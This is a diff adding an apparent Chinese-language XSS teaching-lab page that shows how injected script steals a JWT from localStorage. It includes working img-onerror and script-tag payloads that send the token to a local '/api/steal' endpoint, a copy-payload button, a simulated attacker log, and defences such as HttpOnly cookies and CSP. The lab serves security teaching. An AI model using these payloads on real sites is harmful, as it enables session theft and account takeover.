@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>实验三：XSS 窃取凭证</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <nav class="nav">
+      <a href="index.html">← 返回首页</a>
+    </nav>
+
+    <header>
+      <h1>🔑 实验三：XSS 窃取凭证</h1>
+      <p class="subtitle">Token Stealing via XSS</p>
+    </header>
+
+    <section>
+      <h2>📖 原理说明</h2>
+      <p>这是 XSS 最危险的利用方式之一：</p>
+      <ol style="margin: 1rem 0 0 1.5rem;">
+        <li>用户登录后，Token 存储在 localStorage</li>
+        <li>攻击者通过 XSS 注入恶意脚本</li>
+        <li>脚本读取 localStorage 中的 Token</li>
+        <li>将 Token 发送到攻击者服务器</li>
+        <li><strong>攻击者获得用户身份！</strong></li>
+      </ol>
+      <div class="warning-box" style="margin-top: 1rem;">
+        <strong>⚠️ 核心问题</strong>
+        <p>localStorage 对 JavaScript 完全可见，XSS + JWT = 灾难！</p>
+      </div>
+    </section>
+
+    <section>
+      <h2>👤 模拟用户登录</h2>
+      <p>点击按钮模拟用户登录，Token 会存储到 localStorage：</p>
+      
+      <div style="margin: 1rem 0;">
+        <button class="btn" onclick="simulateLogin()">模拟登录（生成 Token）</button>
+        <button class="btn btn-secondary" onclick="logout()">退出登录</button>
+      </div>
+
+      <div class="token-display" id="tokenDisplay">
+        <strong>当前 Token：</strong>
+        <p id="currentToken" style="margin-top: 0.5rem; color: #fcc419;">未登录</p>
+      </div>
+    </section>
+
+    <section>
+      <h2>⚔️ 攻击演示</h2>
+      
+      <p>攻击者会在评论中注入以下代码：</p>
+      <pre><code>&lt;img src=x onerror="
+  fetch('/api/steal?token=' + localStorage.getItem('token'))
+"&gt;</code></pre>
+
+      <p style="margin-top: 1rem;">或者更隐蔽的方式：</p>
+      <pre><code>&lt;script&gt;
+  new Image().src = '/api/steal?token=' + localStorage.getItem('token')
+&lt;/script&gt;</code></pre>
+
+      <div style="margin: 1.5rem 0;">
+        <button class="btn" onclick="simulateAttack()" style="background: #ff6b6b;">
+          🚨 模拟攻击（窃取当前 Token）
+        </button>
+      </div>
+
+      <div class="info-box">
+        <strong>💡 去评论页注入攻击代码：</strong>
+        <p style="margin-top: 0.5rem;">
+          复制以下代码到 <a href="comment.html" style="color: #e94560;">评论系统</a> 发表：
+        </p>
+        <pre style="margin-top: 0.5rem;"><code>&lt;img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))"&gt;</code></pre>
+        <button class="btn btn-secondary" onclick="copyPayload()" style="margin-top: 0.5rem;">复制 Payload</button>
+      </div>
+    </section>
+
+    <section>
+      <h2>📋 攻击者服务器日志</h2>
+      <p>以下是"攻击者服务器"收到的被窃取 Token：</p>
+      
+      <div style="margin: 1rem 0;">
+        <button class="btn btn-secondary" onclick="loadStolenTokens()">刷新日志</button>
+        <button class="btn btn-secondary" onclick="clearStolenTokens()">清空日志</button>
+      </div>
+
+      <div class="attack-log" id="stolenLog">
+        <p style="color: #888;">加载中...</p>
+      </div>
+    </section>
+
+    <section>
+      <h2>🛡️ 防御方案</h2>
+      
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">1. HttpOnly Cookie</h3>
+      <p>将 Token 存储在 HttpOnly Cookie 中，JavaScript 无法读取：</p>
+      <pre><code>// 服务端设置
+res.cookie('token', jwt, {
+  httpOnly: true,  // JS 无法读取
+  secure: true,    // 仅 HTTPS
+  sameSite: 'strict'
+})</code></pre>
+
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">2. CSP 策略</h3>
+      <p>限制脚本来源和外部请求：</p>
+      <pre><code>Content-Security-Policy: 
+  script-src 'self';
+  connect-src 'self';</code></pre>
+
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">3. Token 绑定</h3>
+      <p>将 Token 与用户 IP、User-Agent 绑定，异常时失效</p>
+
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">4. 短期 Token + Refresh Token</h3>
+      <p>Access Token 有效期短（如 15 分钟），降低泄露风险</p>
+    </section>
+
+    <section>
+      <h2>💡 安全建议</h2>
+      <div class="success-box">
+        <ul style="margin-left: 1.5rem;">
+          <li><strong>敏感数据不要存 localStorage</strong></li>
+          <li>使用 HttpOnly Cookie 存储认证信息</li>
+          <li>实施严格的 CSP 策略</li>
+          <li>对所有用户输入进行转义</li>
+          <li>定期审计代码中的 XSS 漏洞</li>
+        </ul>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    // 页面加载时检查 Token 和加载日志
+    updateTokenDisplay()
+    loadStolenTokens()
+
+    function simulateLogin() {
+      // 生成模拟 JWT Token
+      const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }))
+      const payload = btoa(JSON.stringify({
+        userId: 1001,
+        username: 'victim_user',
+        role: 'admin',
+        exp: Date.now() + 3600000
+      }))
+      const signature = btoa('fake_signature_' + Math.random().toString(36).slice(2))
+      const token = `${header}.${payload}.${signature}`
+      
+      localStorage.setItem('token', token)
+      updateTokenDisplay()
+      alert('登录成功！Token 已存储到 localStorage')
+    }
+
+    function logout() {
+      localStorage.removeItem('token')
+      updateTokenDisplay()
+      alert('已退出登录')
+    }
+
+    function updateTokenDisplay() {
+      const token = localStorage.getItem('token')
+      const el = document.getElementById('currentToken')
+      if (token) {
+        el.textContent = token
+        el.style.color = '#51cf66'
+      } else {
+        el.textContent = '未登录'
+        el.style.color = '#888'
+      }
+    }
+
+    function simulateAttack() {
+      const token = localStorage.getItem('token')
+      if (!token) {
+        alert('请先登录！')
+        return
+      }
+      
+      // 模拟 XSS 攻击窃取 Token
+      fetch('/api/steal?token=' + encodeURIComponent(token))
+        .then(() => {
+          alert('🚨 Token 已被窃取！查看下方攻击者日志')
+          loadStolenTokens()
+        })
+    }
+
+    async function loadStolenTokens() {
+      const logEl = document.getElementById('stolenLog')
+      
+      try {
+        const res = await fetch('/api/steal/list')
+        const data = await res.json()
+        
+        if (data.tokens.length === 0) {
+          logEl.innerHTML = '<p style="color: #888;">暂无记录</p>'
+          return
+        }
+        
+        logEl.innerHTML = data.tokens.map((t, i) => `
+          <div class="log-item">
+            <strong style="color: #ff6b6b;">#${i + 1} Token 被窃取</strong>
+            <p style="margin-top: 0.3rem; word-break: break-all;">
+              <code>${escapeHtml(t.token)}</code>
+            </p>
+            <p style="color: #888; font-size: 0.85rem; margin-top: 0.3rem;">
+              时间: ${t.time} | IP: ${t.ip}
+            </p>
+          </div>
+        `).reverse().join('')
+        
+      } catch (err) {
+        logEl.innerHTML = '<p style="color: #ff6b6b;">加载失败</p>'
+      }
+    }
+
+    async function clearStolenTokens() {
+      await fetch('/api/steal/clear', { method: 'DELETE' })
+      loadStolenTokens()
+    }
+
+    function copyPayload() {
+      const payload = `<img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))">`
+      navigator.clipboard.writeText(payload)
+      alert('Payload 已复制！去评论页粘贴发表')
+    }
+
+    function escapeHtml(str) {
+      const div = document.createElement('div')
+      div.textContent = str
+      return div.innerHTML
+    }
+  </script>
+</body>
+</html>
